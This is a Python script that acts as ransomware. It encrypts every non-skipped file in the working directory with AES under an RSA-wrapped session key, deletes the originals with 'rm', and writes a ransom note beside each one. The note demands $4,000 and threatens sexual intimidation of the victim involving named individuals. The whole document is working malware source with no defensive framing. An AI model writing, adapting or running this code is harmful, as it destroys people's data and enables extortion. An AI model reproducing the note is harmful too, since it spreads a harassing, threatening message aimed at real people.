from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import sys
import subprocess
import os
from Crypto.PublicKey import RSA

# encrypt the data and replace the file with encrypted files
# function takes in the name of the file plus the file extension
# Ex: test.py -> fileName = 'test', exention = '.py'
def encrypt_data(fileName, extension, my_pubkey):
    f = open(fileName + extension, 'rb')
    data = f.read()
    f.close()

    recipient_key = RSA.import_key(my_pubkey)
    session_key = get_random_bytes(16) # generate session key

    # Encrypt the session key with the public RSA key
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key) #***************

    # NOTE: Using the public key, we encrypt the randomly generated key
    #       that is used to actually encrypt the data

    # Encrypt the data with the AES session key
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)

    noteData = """Give me $4,000 or I will personally send my suitemate 
    Matan to your room (he is large and very strong) and he will bring his
    'friend' Eden and they will have sex on your bed. Pay up loser. 
    Along with the $4,000 you need to send me the encrypted file 
    as well as the encrypted key, then i will be able to return your
    file back to you"""

    fileOutName = fileName + extension + ".encrypted"
    keyOutName = fileName + ".key.encrypted"
    noteOutName = fileName + extension + ".note"

    fileOut = open(fileOutName, "wb")
    [fileOut.write(x) for x in (cipher_aes.nonce, tag, ciphertext)]
    fileOut.close()

    keyOut = open(keyOutName, "wb")
    keyOut.write(enc_session_key)
    keyOut.close()

    noteOut = open(noteOutName, "wb")
    noteOut.write(noteData.encode('utf-8')) #maybe issue
    noteOut.close()

    # delete original file
    subprocess.Popen(["rm", fileName + extension])


public_key = open("receiver.pem").read()

# We get the current working directory with os.getcwd()
dirs = os.listdir(os.getcwd())
skipFiles = {"py","pem","encrypted","note"}
# iterate through the files in the current directory
for file in dirs:
    # break the file name up into the 'parts' (split by '.')
    fileParts = file.split(".")

    fileParts = file.split(".")
    fileName = fileParts[0]
    extension = fileParts[-1]

    # for loop in case file has extensions
    for i in range(1, len(fileParts) - 1, 1):
        fileName = fileName + "." + fileParts[i]

    # We ignore .py files, .pem files, and hidden files
    if(fileParts[-1] not in skipFiles and fileParts[0] != ""):
        encrypt_data(fileName, "." + extension, public_key)
